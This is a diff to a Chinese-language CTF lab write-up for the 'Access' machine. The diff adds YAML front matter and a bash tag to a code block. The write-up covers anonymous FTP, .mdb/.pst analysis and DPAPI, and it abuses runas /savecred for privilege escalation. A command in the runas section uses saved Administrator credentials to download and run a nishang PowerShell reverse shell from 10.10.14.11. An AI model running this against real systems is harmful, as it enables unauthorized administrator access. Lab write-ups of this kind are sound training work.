@@ -1,7 +1,14 @@
-# Access
-
-- 練習日期:   2026/04/17
-- 考點:       FTP 匿名登入、.mdb 及 .pst 舊版資料庫與郵件檔分析、runas /savecred 濫用、DPAPI 憑證解密。
+---
+title: Access
+description: 
+tags:
+  - FTP
+  - mdb
+  - pst
+  - runas
+  - DPAPI
+date: 2026-04-17
+---
 
 ## FTP 匿名登入
 
@@ -22,7 +29,7 @@
 runas /savecred 是 Windows 提供的一個功能，允許使用者在第一次使用 runas 命令時輸入密碼，並將該密碼保存起來，以便下次使用時不需要再次輸入。
 做法是搭配 nishang 來建立 reverse shell。
 
-```
+```bash
 git clone https://github.com/samratashok/nishang.git
 vim nishang/Shells/Invoke-PowerShellTcp.ps1             ## 修改 IP 和 Port
 C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
